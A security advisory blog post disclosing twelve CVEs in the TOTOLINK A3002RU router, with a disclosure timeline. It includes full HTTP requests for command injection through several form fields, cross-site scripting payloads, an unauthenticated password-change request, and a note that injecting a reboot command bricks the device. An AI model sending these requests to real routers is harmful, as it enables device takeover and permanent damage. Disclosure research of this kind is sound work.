=== Content from blog.securityevaluators.com_8663690a_20250124_234248.html ===
[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2Fd6f42a081154&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&source=---top_nav_layout_nav----------------------------------)

[Sign up](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fblog.securityevaluators.com%2Fnew-vulnerabilities-in-totolink-a3002ru-d6f42a081154&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fblog.securityevaluators.com%2Fnew-vulnerabilities-in-totolink-a3002ru-d6f42a081154&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav-----------)

[Sign up](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fblog.securityevaluators.com%2Fnew-vulnerabilities-in-totolink-a3002ru-d6f42a081154&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fblog.securityevaluators.com%2Fnew-vulnerabilities-in-totolink-a3002ru-d6f42a081154&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)
# New Vulnerabilities in TOTOLINK A3002RU

## ISE Labs awarded 12 CVEs for research performed on low-cost router

[![Joshua Meyer](https://miro.medium.com/v2/resize:fill:88:88/2*6d-dcjQ9goKYRtXwRh4FUA.jpeg)](https://medium.com/%40jmeyer_61724?source=post_page---byline--d6f42a081154--------------------------------)[![Independent Security Evaluators](https://miro.medium.com/v2/resize:fill:48:48/1*zlPb8cRt0y45p5s2efL2uw.png)](https://blog.securityevaluators.com/?source=post_page---byline--d6f42a081154--------------------------------)

[Joshua Meyer](https://medium.com/%40jmeyer_61724?source=post_page---byline--d6f42a081154--------------------------------)

·

[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F29362804af4a&operation=register&redirect=https%3A%2F%2Fblog.securityevaluators.com%2Fnew-vulnerabilities-in-totolink-a3002ru-d6f42a081154&user=Joshua+Meyer&userId=29362804af4a&source=post_page-29362804af4a--byline--d6f42a081154---------------------post_header-----------)

Published in[Independent Security Evaluators](https://blog.securityevaluators.com/?source=post_page---byline--d6f42a081154--------------------------------)·5 min read·Nov 7, 2018

--

Listen

Share

The TOTOLINK A3002RU is a basic wireless router with largely favorable reviews. As part of ISE Labs ongoing research into the current state of security in IoT and embedded devices, we examined the A3002RU.

It turns out this device is seriously lacking in security, so much so that it’s even missing a robust authentication mechanism for the administrative web application. During the course of our review, we even permanently bricked the A3002RU after a command injection payload.

The TOTOLINK’s web application nominally requires authentication — a user must sign in with the proper username and password — but the server doesn’t send session tokens. Effectively, as long as someone has signed in recently (approximately 5 minutes), any request sent to the router will be considered authenticated. Even this behavior is not always true, as some requests may be sent at any time.

Authentication issues aside, many of the user input forms in the web application are vulnerable to cross-site scripting, command injection, or both.

With that being said, here are our findings affecting version 1.0.8:

![]()
## **Admin Password returned in password.htm (CVE-2018-13313)**

The router provides a page that allows the user to change their account name and password. This page, `password.htm`, contains JavaScript which is used to confirm the user knows their current password before allowing them to change their password. However, this JavaScript contains the current user’s password in plaintext.

A truncated `password.htm` is shown below. The admin password is shown in the `orgpassword` variable.

```
<html>
<head>
<meta http-equiv='Content-Type' content='text/html;charset=utf-8'>
<SCRIPT language=Javascript src='language_en.js'></SCRIPT>
<meta http-equiv='Pragma' content='no-cache'>
<meta HTTP-equiv='Cache-Control' content='no-cache'>
<meta HTTP-EQUIV='Expires' CONTENT='Mon, 01 Jan 1990 00:00:01 GMT'>
<title>TOTOLINK</title>
<link href='/style.css' rel='stylesheet' type='text/css'>
<script type='text/javascript' src='util_gw.js'></script>
<script src='jquery.min.js'></script>
<style>table.easy_wth,fieldset,.hr_easy,TABLE,TABLE.vlan_wth,table.stus_wth,.hr_styleset,.divcss5,hr{width:800px;}</style><SCRIPT>function includeSpace(str)
{
  for (var i=0; i<str.length; i++) {
   if ( str.charAt(i) == ' ' ) {
   return true;
 }
  }
  return false;
}function saveChanges()
{
var orgusername='admin';
var orgpassword='admin';
```
## Cross-site Scripting in notice\_gen.htm (CVE-2018-13312)

By setting the “Input your notice URL“ field to be a cross-site scripting payload, attackers can execute arbitrary JavaScript. The following is an example payload:

`‘><script>alert(64)</script>`

## Cross-site Scripting in notice\_gen.htm (CVE-2018-13308)

By setting the “User phrases button” field to be a cross-site scripting payload, attackers can execute arbitrary JavaScript. The following is an example payload:

`‘><script>alert(64)</script>`

## Cross-site Scripting in password.htm (CVE-2018-13309)

By setting the user’s password to something similar to:

`‘; console.log(“ise”);’`

arbitrary JavaScript can be executed when the user attempts to change their password on `password.htm`.

## Cross-site Scripting in password.htm (CVE-2018-13310)

By setting the user’s username to something similar to:

`‘; console.log(“ise”);’`

arbitrary JavaScript can be executed when the user attempts to change their username on `password.htm`.

## Missing Server-side Validation of Current Password During Password Change (CVE-2018-13315)

When a user changes their password, their current password is validated via client-side JavaScript, but is not verified by the server. Because there are no authentication tokens, an attacker can make a request similar to the following to change the user account password:

```
POST /boafrm/formPasswordSetup HTTP/1.1
Host: 192.168.1.64
User-Agent: Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.1.64/password.htm
Content-Type: application/x-www-form-urlencoded
Content-Length: 146
Connection: close
Upgrade-Insecure-Requests: 1passwdType=1&Cusername=admin&Cpassword=&username=admin&newpass=ise&confpass=ise&submit-url=%2Fstatus.htm&submit-url-ssh=%2Fpassword.htm&save=Apply
```
## Command Injection via Samba Username (CVE-2018-13311)

By including ```` in the Samba username, arbitrary system commands can be executed. The following is an example which creates a file in `/tmp`:

```
POST /boafrm/formDlna HTTP/1.1
Host: 192.168.1.64User-Agent: Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.1.64/usbshare.htm
Content-Type: application/x-www-form-urlencoded
Content-Length: 218
Connection: close
Upgrade-Insecure-Requests: 1dlnaEnabled=ON&sambaEnabled=ON&sambaType=1&sambaUser=sambashare%60echo%20%22ise%22%20%3E%20%2Ftmp%2Fisefile%60&sambaPassword=hello&ftpEnabled=ON&ftpUser=ftpshare&ftpPassword=hello&submit-url=%2Fusbshare.htm&apply=Apply
```
## Command Injection via FTP Username (CVE-2018-13306)

By including ```` in the FTP username, arbitrary system commands can be executed. The following is an example which creates a file in `/tmp`:

```
POST /boafrm/formDlna HTTP/1.1
Host: 192.168.1.64
User-Agent: Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.1.64/usbshare.htm
Content-Type: application/x-www-form-urlencoded
Content-Length: 218
Connection: close
Upgrade-Insecure-Requests: 1dlnaEnabled=ON&sambaEnabled=ON&sambaType=1&sambaUser=sambashare&sambaPassword=hello&ftpEnabled=ON&ftpUser=ftpshare%60echo%20%22ise%22%20%3E%20%2Ftmp%2Fisefile%60&ftpPassword=hello&submit-url=%2Fusbshare.htm&apply=Apply
```
## Command Injection via NTP Server IP Address (CVE-2018-13307)

By including ```` in the NTP Server IP address, arbitrary commands may be executed. The following example creates a file in `/tmp`:

```
POST /boafrm/formNtp HTTP/1.1
Host: 192.168.2.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.2.1/ntp.htm
Content-Type: application/x-www-form-urlencoded
Content-Length: 208
Cookie: stay_login=0; id=ojpbJkLhWAE6s1750P4N313200
Connection: close
Upgrade-Insecure-Requests: 1year=2018&month=5&day=11&hour=14&minute=43&second=6&get_gmts=Get+GMT&timeZone=0+2&enabled=ON&ntpServerIp1=192.5.41.41&ntpServerId=1&ntpServerIp2=%60echo%20%22ise%22%20%3E%20%2Ftmp%2Fisefile2%60&submit-url=%2Fntp.htm&save=Apply&reset=Refresh
```

**Note that when the command** ``reboot now`` **is injected, the router becomes permanently inoperable.**

## Command Injection in formAliasIP (CVE-2018-13314)

By including ```` in the `ipAddr` parameter, arbitrary commands may be executed. The following example creates a file in `/tmp`:

```
POST /boafrm/formAliasIP HTTP/1.1
Host: 192.168.1.64
User-Agent: Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.1.64/nat_addr_map.htm
Content-Type: application/x-www-form-urlencoded
Content-Length: 189
Connection: close
Upgrade-Insecure-Requests: 1enabled=ON&enabled_val=1&ipAddr=192.168.1.112%60echo%20%22ise%22%20%3E%20%2Ftmp%2Fiseise%60&subnet=255.255.255.255&gateway=&iface=2&metric=0&addIPRecord=Apply&submit-url=%2Fnat_addr_map.htm
```
## Command Injection in formAliasIP (CVE-2018-13316)

By including ```` in the `subnet` parameter, arbitrary commands may be executed. The following example creates a file in `/tmp`:

```
POST /boafrm/formAliasIP HTTP/1.1
Host: 192.168.1.64
User-Agent: Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.1.64/nat_addr_map.htm
Content-Type: application/x-www-form-urlencoded
Content-Length: 192
Connection: close
Upgrade-Insecure-Requests: 1enabled=ON&enabled_val=1&ipAddr=192.168.1.112&subnet=255.255.255.255%60echo%20%22ise%22%20%3E%20%2Ftmp%2Fiseiseise%60&gateway=&iface=2&metric=0&addIPRecord=Apply&submit-url=%2Fnat_addr_map.htm
```
## Cross-site scripting via URL Filter (CVE-2018-13317)

By adding a URL address containing a cross-site scripting payload, e.g. `<img src=a onerror=alert(1)>`, then arbitrary JavaScript can be executed upon page load. A full request is shown below:

```
POST /boafrm/formFilter HTTP/1.1
Host: 192.168.1.64
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.1.64/urlfilter.htm
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 141enabled=1&url=%3Cimg%20src%3Da%20onerror%3Dalert(1)%3E&urlFilterMode=&urlFilterBlack=blackList&addFilterUrl=Apply&submit-url=%2Furlfilter.htm
```
# Responsible Disclosure Timeline

**May 30, 2018:** Contacted TOTOLINK
**July 2, 2018:** Contacted TOTOLINK again
**July 3, 2018:** Reported vulnerabilities

TOTOLINK has not responded to any of our emails.

[*Joshua Meyer*](https://medium.com/%40jmeyer_61724) *is an Associate Security Analyst at* [*Independent Security Evaluators*](http://securityevaluators.com)*, a firm of security specialists that provide a wide range of services including custom security assessments and software development. ISE also runs* [*IoT Village*](https://www.iotvillage.org)*, which hosts talks by expert security researchers who dissect real-world exploits and hacking contests consisting of off-the-shelf IoT devices.*

*Twitter*: [*@ISESecurity*](https://twitter.com/ISEsecurity)

[**Sign up to get our latest blogs.**](http://eepurl.com/bLc2bf)

[Hacking](https://medium.com/tag/hacking?source=post_page-----d6f42a081154--------------------------------)[IoT](https://medium.com/tag/iot?source=post_page-----d6f42a081154--------------------------------)[Cybersecurity](https://medium.com/tag/cybersecurity?source=post_page-----d6f42a081154--------------------------------)[Ise Labs](https://medium.com/tag/ise-labs?source=post_page-----d6f42a081154--------------------------------)[Cve](https://medium.com/tag/cve?source=post_page-----d6f42a081154--------------------------------)

--

--

[![Independent Security Evaluators](https://miro.medium.com/v2/resize:fill:96:96/1*zlPb8cRt0y45p5s2efL2uw.png)](https://blog.securityevaluators.com/?source=post_page---post_publication_info--d6f42a081154--------------------------------)[![Independent Security Evaluators](https://miro.medium.com/v2/resize:fill:128:128/1*zlPb8cRt0y45p5s2efL2uw.png)](https://blog.securityevaluators.com/?source=post_page---post_publication_info--d6f42a081154--------------------------------)[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fcollection%2Findependent-security-evaluators&operation=register&redirect=https%3A%2F%2Fblog.securityevaluators.com%2Fnew-vulnerabilities-in-totolink-a3002ru-d6f42a081154&collection=Independent+Security+Evaluators&collectionId=85ea1a550e4c&source=post_page---post_publication_info--d6f42a081154---------------------follow_profile-----------)[## Published in Independent Security Evaluators](https://blog.securityevaluators.com/?source=post_page---post_publication_info--d6f42a081154--------------------------------)[1K Followers](/followers?source=post_page---post_publication_info--d6f42a081154--------------------------------)·[Last published Mar 7, 2022](/reading-hackable-without-a-background-in-security-a22ebe59b3e8?source=post_page---post_publication_info--d6f42a081154--------------------------------)

Security specialists that provide custom services including security assessments and software development. ISE also runs IoT Village, which hosts talks by expert security researchers and hacking contests.

[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fcollection%2Findependent-security-evaluators&operation=register&redirect=https%3A%2F%2Fblog.securityevaluators.com%2Fnew-vulnerabilities-in-totolink-a3002ru-d6f42a081154&collection=Independent+Security+Evaluators&collectionId=85ea1a550e4c&source=post_page---post_publication_info--d6f42a081154---------------------follow_profile-----------)[![Joshua Meyer](https://miro.medium.com/v2/resize:fill:96:96/2*6d-dcjQ9goKYRtXwRh4FUA.jpeg)](https://medium.com/%40jmeyer_61724?source=post_page---post_author_info--d6f42a081154--------------------------------)[![Joshua Meyer](https://miro.medium.com/v2/resize:fill:128:128/2*6d-dcjQ9goKYRtXwRh4FUA.jpeg)](https://medium.com/%40jmeyer_61724?source=post_page---post_author_info--d6f42a081154--------------------------------)[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F29362804af4a&operation=register&redirect=https%3A%2F%2Fblog.securityevaluators.com%2Fnew-vulnerabilities-in-totolink-a3002ru-d6f42a081154&user=Joshua+Meyer&userId=29362804af4a&source=post_page-29362804af4a--post_author_info--d6f42a081154---------------------follow_profile-----------)[## Written by Joshua Meyer](https://medium.com/%40jmeyer_61724?source=post_page---post_author_info--d6f42a081154--------------------------------)[28 Followers](https://medium.com/%40jmeyer_61724/followers?source=post_page---post_author_info--d6f42a081154--------------------------------)·[2 Following](https://medium.com/%40jmeyer_61724/following?source=post_page---post_author_info--d6f42a081154--------------------------------)

Security Analyst at Independent Security Evaluators

[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F29362804af4a&operation=register&redirect=https%3A%2F%2Fblog.securityevaluators.com%2Fnew-vulnerabilities-in-totolink-a3002ru-d6f42a081154&user=Joshua+Meyer&userId=29362804af4a&source=post_page-29362804af4a--post_author_info--d6f42a081154---------------------follow_profile-----------)
## No responses yet

[Help](https://help.medium.com/hc/en-us?source=post_page-----d6f42a081154--------------------------------)[Status](https://medium.statuspage.io/?source=post_page-----d6f42a081154--------------------------------)[About](https://medium.com/about?autoplay=1&source=post_page-----d6f42a081154--------------------------------)[Careers](https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----d6f42a081154--------------------------------)[Press](pressinquiries%40medium.com?source=post_page-----d6f42a081154--------------------------------)[Blog](https://blog.medium.com/?source=post_page-----d6f42a081154--------------------------------)[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----d6f42a081154--------------------------------)[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----d6f42a081154--------------------------------)[Text to speech](https://speechify.com/medium?source=post_page-----d6f42a081154--------------------------------)[Teams](https://medium.com/business?source=post_page-----d6f42a081154--------------------------------)


